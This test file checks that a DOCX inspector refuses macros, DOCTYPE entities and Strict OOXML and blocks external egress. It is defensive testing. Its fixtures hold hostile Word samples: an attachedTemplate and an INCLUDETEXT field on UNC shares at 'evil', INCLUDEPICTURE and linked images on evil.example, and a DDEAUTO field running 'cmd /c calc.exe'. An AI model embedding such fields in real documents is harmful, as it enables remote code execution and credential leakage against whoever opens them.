// @vitest-environment jsdom
import { buildZip } from './test-helpers/zip-fixture.js';
import { openZip } from './zip-reader.js';
import { inspectDocx, rejectDoctype, OoxmlInspectError } from './ooxml-inspect.js';

// Fixtures use method 0 (store) so the jsdom environment needs no
// CompressionStream; the reader's stored-entry path is exercised directly.
const XML_DECL = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>';
const CT = `${XML_DECL}<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">`
  + '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
  + '<Default Extension="xml" ContentType="application/xml"/>'
  + '<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>'
  + '</Types>';
const ROOT_RELS = `${XML_DECL}<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">`
  + '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>'
  + '</Relationships>';
const DOC = `${XML_DECL}<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">`
  + '<w:body><w:p><w:r><w:t>Treść pisma.</w:t></w:r></w:p></w:body></w:document>';

function docRels(extra = '') {
  return `${XML_DECL}<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">${extra}</Relationships>`;
}

async function docxOf(parts) {
  const bytes = await buildZip(Object.entries(parts).map(([name, data]) => ({ name, data, method: 0 })));
  return openZip(bytes);
}

function baseParts(overrides = {}) {
  return {
    '[Content_Types].xml': CT,
    '_rels/.rels': ROOT_RELS,
    'word/document.xml': DOC,
    ...overrides,
  };
}

describe('inspectDocx — part resolution (§5.1, by relationship)', () => {
  it('resolves the main part and related token parts', async () => {
    const header = `${XML_DECL}<w:hdr xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:p><w:r><w:t>Sygn.</w:t></w:r></w:p></w:hdr>`;
    const reader = await docxOf(baseParts({
      'word/_rels/document.xml.rels': docRels(
        '<Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/header" Target="header1.xml"/>'
        + '<Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/comments" Target="comments.xml"/>',
      ),
      'word/header1.xml': header,
      'word/comments.xml': `${XML_DECL}<w:comments xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"/>`,
    }));
    const inspection = await inspectDocx(reader);
    expect(inspection.mainPart).toBe('word/document.xml');
    expect(inspection.tokenParts).toEqual(['word/document.xml', 'word/header1.xml']);
    expect(inspection.commentsPart).toBe('word/comments.xml');
    expect(inspection.external).toEqual({ hyperlinks: 0, blocked: [] });
  });

  it('rejects containers that are not DOCX at all', async () => {
    const reader = await docxOf({ 'foo.txt': 'nie docx' });
    await expect(inspectDocx(reader)).rejects.toMatchObject({ code: 'NOT_DOCX' });
  });
});

describe('inspectDocx — hard refusals (C-DOCX-9, C-DOCX-1)', () => {
  it('macro project disqualifies the file', async () => {
    const reader = await docxOf(baseParts({ 'word/vbaProject.bin': 'MZ' }));
    await expect(inspectDocx(reader)).rejects.toMatchObject({ code: 'MACROS' });
  });

  it('macroEnabled content type disqualifies the file', async () => {
    const ct = CT.replace('</Types>',
      '<Override PartName="/word/document.xml" ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/></Types>');
    const reader = await docxOf(baseParts({ '[Content_Types].xml': ct }));
    await expect(inspectDocx(reader)).rejects.toMatchObject({ code: 'MACROS' });
  });

  it('Strict OOXML is refused loudly, never a silent zero', async () => {
    const strictDoc = DOC.replace(
      'http://schemas.openxmlformats.org/wordprocessingml/2006/main',
      'http://purl.oclc.org/ooxml/wordprocessingml/main',
    );
    const reader = await docxOf(baseParts({ 'word/document.xml': strictDoc }));
    await expect(inspectDocx(reader)).rejects.toMatchObject({ code: 'STRICT_OOXML' });
  });

  it('a DOCTYPE anywhere in an inspected part rejects the document', async () => {
    const evil = `<?xml version="1.0"?><!DOCTYPE w [<!ENTITY x "y">]>${DOC.slice(XML_DECL.length)}`;
    const reader = await docxOf(baseParts({ 'word/document.xml': evil }));
    await expect(inspectDocx(reader)).rejects.toMatchObject({ code: 'DOCTYPE' });
    expect(() => rejectDoctype('<!ENTITY a "b">', 'x')).toThrow(OoxmlInspectError);
  });

  it('broken XML in a rels part is a hard rejection, not a skipped part', async () => {
    const reader = await docxOf(baseParts({ '_rels/.rels': '<Relationships><unclosed' }));
    await expect(inspectDocx(reader)).rejects.toMatchObject({ code: 'PARSE' });
  });
});

describe('inspectDocx — egress classification (§9.3, C-DOCX-8)', () => {
  it('external hyperlinks are allowed and counted', async () => {
    const reader = await docxOf(baseParts({
      'word/_rels/document.xml.rels': docRels(
        '<Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://sip.legalis.pl/" TargetMode="External"/>',
      ),
    }));
    const inspection = await inspectDocx(reader);
    expect(inspection.external.hyperlinks).toBe(1);
    expect(inspection.external.blocked).toEqual([]);
  });

  it('attachedTemplate on an external target blocks', async () => {
    const reader = await docxOf(baseParts({
      'word/_rels/settings.xml.rels': docRels(
        '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\evil\\share\\t.dotm" TargetMode="External"/>',
      ),
    }));
    const inspection = await inspectDocx(reader);
    expect(inspection.external.blocked).toHaveLength(1);
    expect(inspection.external.blocked[0]).toMatchObject({ part: 'word/_rels/settings.xml.rels' });
  });

  it('an externally linked image blocks', async () => {
    const reader = await docxOf(baseParts({
      'word/_rels/document.xml.rels': docRels(
        '<Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="http://evil.example/x.png" TargetMode="External"/>',
      ),
    }));
    const inspection = await inspectDocx(reader);
    expect(inspection.external.blocked[0].type).toContain('/image');
  });

  it('hostile field instructions (INCLUDE*/DDE*) block', async () => {
    const fieldDoc = DOC.replace(
      '<w:r><w:t>Treść pisma.</w:t></w:r>',
      '<w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve"> INCLUDETEXT "\\\\evil\\x.docx" </w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r>',
    );
    const reader = await docxOf(baseParts({ 'word/document.xml': fieldDoc }));
    const inspection = await inspectDocx(reader);
    expect(inspection.external.blocked[0].type).toBe('field:INCLUDETEXT');
  });

  it('a plain internal document reports zero egress findings', async () => {
    const reader = await docxOf(baseParts());
    const inspection = await inspectDocx(reader);
    expect(inspection.external).toEqual({ hyperlinks: 0, blocked: [] });
  });

  // MD3-D1: `w:` is a convention, not a guarantee — a document may legally
  // bind the wordprocessingml namespace to any other prefix. The literal
  // `<w:instrText`/`<w:fldSimple` regex would never see this; the
  // namespace-aware DOM scan must catch it regardless.
  it('a hostile field instruction under an ALIASED namespace prefix still blocks (regex would miss this)', async () => {
    const aliasedDoc = `${XML_DECL}<x:document xmlns:x="http://schemas.openxmlformats.org/wordprocessingml/2006/main">`
      + '<x:body><x:p><x:r><x:fldChar x:fldCharType="begin"/></x:r>'
      + '<x:r><x:instrText xml:space="preserve"> DDEAUTO "cmd" "/c calc.exe" </x:instrText></x:r>'
      + '<x:r><x:fldChar x:fldCharType="end"/></x:r></x:p></x:body></x:document>';
    expect(aliasedDoc).not.toMatch(/<w:instrText/); // sanity: the old regex truly cannot see this
    const reader = await docxOf(baseParts({ 'word/document.xml': aliasedDoc }));
    const inspection = await inspectDocx(reader);
    expect(inspection.external.blocked).toHaveLength(1);
    expect(inspection.external.blocked[0]).toMatchObject({ part: 'word/document.xml', type: 'field:DDEAUTO' });
  });

  it('a hostile fldSimple instruction under an aliased prefix still blocks', async () => {
    const aliasedDoc = `${XML_DECL}<x:document xmlns:x="http://schemas.openxmlformats.org/wordprocessingml/2006/main">`
      + '<x:body><x:p><x:fldSimple x:instr="INCLUDEPICTURE &quot;http://evil.example/x.png&quot;">'
      + '<x:r><x:t>result</x:t></x:r></x:fldSimple></x:p></x:body></x:document>';
    const reader = await docxOf(baseParts({ 'word/document.xml': aliasedDoc }));
    const inspection = await inspectDocx(reader);
    expect(inspection.external.blocked).toHaveLength(1);
    expect(inspection.external.blocked[0].type).toBe('field:INCLUDEPICTURE');
  });
});
